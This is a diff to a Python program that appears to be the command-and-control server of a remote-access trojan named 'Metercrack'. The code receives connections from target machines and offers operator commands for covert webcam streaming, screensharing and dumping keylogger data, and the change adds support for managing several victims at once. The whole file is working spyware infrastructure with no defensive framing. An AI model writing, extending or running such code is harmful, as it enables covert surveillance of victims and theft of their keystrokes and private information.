@@ -1,12 +1,10 @@
 import socket
 import threading
 import time
-from flask import Flask, Response, request, render_template_string
-from colorama import Fore, Style, init
+from flask import Flask, Response, render_template_string
+from colorama import Fore, init
 import cv2
 import numpy as np
-import sys
-import os
 import keyboard  # Import the keyboard library
 
 init(autoreset=True)
@@ -42,10 +40,10 @@ html_template = """
 </html>
 """
 
-def start_streaming(client_socket, mode):
+def start_streaming(client_socket, mode, client_id):
     global streaming
     streaming = True
-    print(Fore.BLUE + "[ * ] Starting...")
+    print(Fore.BLUE + "[ * ] Starting streaming session...")
     time.sleep(1)
     print(Fore.BLUE + "[ * ] Preparing player...")
     time.sleep(1)
@@ -54,12 +52,12 @@ def start_streaming(client_socket, mode):
     def index():
         return render_template_string(html_template)
 
-    @app.route('/video_feed')
+    @app.route(f'/video_feed_{client_id}')
     def video_feed():
-        return Response(generate_frames(client_socket),
+        return Response(generate_frames(client_socket, client_id),
                         mimetype='multipart/x-mixed-replace; boundary=frame')
 
-    @app.route('/stop_streaming')
+    @app.route(f'/stop_streaming_{client_id}')
     def stop_streaming():
         global streaming
         streaming = False
@@ -71,7 +69,7 @@ def start_streaming(client_socket, mode):
     # Run the Flask app in a separate thread to handle the streaming
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
 
-def generate_frames(client_socket):
+def generate_frames(client_socket, client_id):
     global streaming
     while streaming:
         data = client_socket.recv(921600)
@@ -107,11 +105,14 @@ def dump_keylogger_data():
 
 def handle_client(client_socket, addr):
     target_ip, target_port = addr
-    print(Fore.GREEN + f"[ * ] Metercrack session 1 opened (0.0.0.0:9999 -> {target_ip}:{target_port})")
+    client_id = f"{target_ip}:{target_port}"
+    print(Fore.GREEN + f"[ * ] Session started for {client_id}")
+
+    clients[client_id] = {'socket': client_socket, 'streaming': False, 'keylogger_data': []}
 
     while True:
         try:
-            command = input(Fore.MAGENTA + "metercrack > ")
+            command = input(Fore.MAGENTA + f"metercrack ({client_id}) > ")
         except EOFError:
             break
 
@@ -153,9 +154,8 @@ def handle_client(client_socket, addr):
             continue
 
         elif command.startswith("webcam_stream") or command.startswith("screenshare"):
-            # Define the mode based on the command
             mode = "webcam" if "webcam" in command else "screenshare"
-            start_streaming(client_socket, mode)
+            start_streaming(client_socket, mode, client_id)
             continue
         
         elif command.startswith("webcam_list"):
